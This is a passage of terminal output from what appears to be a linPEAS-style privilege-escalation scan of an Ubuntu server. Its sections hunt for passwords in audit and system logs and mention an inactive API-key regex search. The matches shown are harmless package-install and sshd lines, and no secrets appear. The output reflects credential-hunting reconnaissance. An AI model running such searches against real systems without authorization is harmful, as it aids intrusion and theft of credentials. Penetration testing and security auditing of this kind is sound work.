╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
2024-04-02 12:10:31 configure passwd:amd64 1:4.5-1ubuntu2.5 <none>
2024-04-02 12:10:31 status half-configured passwd:amd64 1:4.5-1ubuntu2
2024-04-02 12:10:31 status half-installed passwd:amd64 1:4.5-1ubuntu2
2024-04-02 12:10:31 status unpacked passwd:amd64 1:4.5-1ubuntu2
2024-04-02 12:10:31 status unpacked passwd:amd64 1:4.5-1ubuntu2.5
2024-04-02 12:10:31 upgrade passwd:amd64 1:4.5-1ubuntu2 1:4.5-1ubuntu2.5
2024-04-02 12:10:32 status half-configured passwd:amd64 1:4.5-1ubuntu2.5
2024-04-02 12:10:32 status installed passwd:amd64 1:4.5-1ubuntu2.5
Apr 13 16:38:07 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Apr 13 16:38:07 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Apr 13 16:58:25 ubuntu-server chage[22444]: changed password expiry for sshd
Apr 13 16:58:25 ubuntu-server usermod[22439]: change user 'sshd' password
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
Binary file /var/log/journal/b096528d39394cc28edb2866b98723d6/user-1000.journal matches
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.44) ...
Setting up passwd (1:4.5-1ubuntu1) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.44) ...
Unpacking base-passwd (3.5.44) over (3.5.44) ...
Unpacking passwd (1:4.5-1ubuntu1) ...



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 

